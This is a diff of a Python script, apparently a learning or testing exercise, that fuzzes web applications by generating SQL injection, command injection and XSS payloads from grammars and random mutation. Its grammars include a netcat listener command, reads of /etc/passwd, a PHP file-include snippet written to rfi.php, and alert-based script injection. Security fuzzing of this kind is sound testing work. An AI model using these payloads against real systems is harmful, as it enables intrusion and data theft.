@@ -5,7 +5,7 @@ sql_GRAMMAR: Grammar = {
     "<start>":
         ["<payload>"],
     "<payload>":
-        ["<S0> <S1> <S2> <S3>"], #["<scheme>://<authority><path><query>"],
+        ["<S0> <S1> <S2> <S3>"],
     "<S0>":
         ["1’", "eETd”", "xDd3')"],
     "<S1>":
@@ -15,7 +15,7 @@ sql_GRAMMAR: Grammar = {
     "<S3>":
         ["--", "#", "/*"],
 }
-#r"<?php include($_GET['page']); ?>" > rfi.php"
+
 RCE_GRAMMAR: Grammar = {
     "<start>":
         ["<payload>"],
@@ -26,7 +26,7 @@ RCE_GRAMMAR: Grammar = {
     "<S1>":
         ["curl", "cat", 'dir', 'echo', 'exec', 'eval', 'ipconfig', 'ls', 'nc -lvp 666', "ping"],
     "<S2>":
-        ["('ls')", "('pwd')", "onerror=”<S3>”", r"C:\Users",'''<?php include($_GET['page']); ?>" > rfi.php''', "('whoami')", r"<img src=http://google.com onload=prompt(2) onerror=alert(3)> batata", "/etc/passwd", "/etc/hosts", "http://google.com", "|id|", "/usr/bin/id", "localhost"], #<img> = batata
+        ["('ls')", "('pwd')", "onerror=”<S3>”", r"C:\Users",'''<?php include($_GET['main.php']); ?>" > rfi.php''', "('whoami')", r"<img src=http://google.com onload=prompt(2) onerror=alert(3)> batata", "/etc/passwd", "/etc/hosts", "http://google.com", "|id|", "/usr/bin/id", "localhost"], #<img> = batata
     "<S3>":
         ["| <S2>"],
 }
@@ -42,19 +42,21 @@ js_GRAMMAR: Grammar = {
     "<S2>":
         ["alert('XSS')", "alert(String.fromCharCode(88,83,83))", "alert(1)"],
     "<S3>":
-        ["abobrinha", ">"], #abobrinha = </script>
+        ["</script>", ">"],
 }
 
 
-#syntax_diagram(CGI_GRAMMAR)
-print("Grammar generation-based")
-for i in range(20):
+
+print("Geração baseada em Gramática")
+for i in range(20): 
+    #Geração de 60 payloads
     print(simple_grammar_fuzzer(grammar=RCE_GRAMMAR, max_nonterminals=20))
     print(simple_grammar_fuzzer(grammar=sql_GRAMMAR, max_nonterminals=20))
     print(simple_grammar_fuzzer(grammar=js_GRAMMAR, max_nonterminals=20))
-
-print("Random mutation")
-seed_input = '" || whoami'
+    
+print("Geração baseada em Mutação Aleatória")
+seed_input = '' #A seed inserida será mutada. Exemplos de seeds: 1' or '1'='1 , <script>alert('XSS')</script> e " || whoami
 mutation_fuzzer = MutationFuzzer(seed=[seed_input])
-for i in range(10):
+for i in range(20):
+    #Geração de 20 payloads  
     mutation_fuzzer.fuzz()
